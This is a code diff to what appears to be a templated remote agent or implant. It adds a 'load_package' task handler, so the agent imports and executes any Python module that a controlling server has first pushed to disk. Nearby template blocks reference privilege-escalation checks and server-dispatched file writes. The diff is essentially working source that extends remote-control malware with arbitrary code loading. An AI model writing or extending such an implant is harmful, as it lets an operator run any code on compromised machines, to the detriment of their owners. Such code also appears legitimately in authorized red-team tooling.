@@ -1911,6 +1911,34 @@ def mod_fs_put(remote_path: str, data: bytes, offset: int = 0) -> dict:
         return {"ok": True, "path": remote_path, "offset": offset, "written": len(data)}
     except Exception as e:
         return {"ok": False, "error": str(e)}
+
+
+def mod_load_package(name: str, path: str, force: bool = False) -> dict:
+    """Import a Python module shipped to *path* under *name*.
+
+    The server is expected to have pushed the source file to *path* first
+    (via fs_put). This handler makes it importable and returns ok/error.
+    """
+    import importlib.util
+    import os as _os
+    import sys as _sys
+    try:
+        d = _os.path.dirname(path)
+        if d and d not in _sys.path:
+            _sys.path.insert(0, d)
+        if name in _sys.modules and not force:
+            return {"ok": True, "name": name, "already_loaded": True}
+        if name in _sys.modules and force:
+            del _sys.modules[name]
+        spec = importlib.util.spec_from_file_location(name, path)
+        if spec is None or spec.loader is None:
+            return {"ok": False, "error": f"cannot load spec for {name} from {path}"}
+        module = importlib.util.module_from_spec(spec)
+        _sys.modules[name] = module
+        spec.loader.exec_module(module)
+        return {"ok": True, "name": name, "path": path}
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
 {% endif %}
 
 {% if include_privesc %}
@@ -2388,6 +2416,10 @@ def _dispatch(task: dict) -> dict:
     if action == "fs_put":
         raw = _b64d(task.get("data", ""))
         return mod_fs_put(task.get("path", ""), raw, int(task.get("offset") or 0))
+    if action == "load_package":
+        return mod_load_package(
+            task.get("name", ""), task.get("path", ""),
+            bool(task.get("force", False)))
     {% endif %}
     {% if include_privesc %}
     if action == "privesc_check":
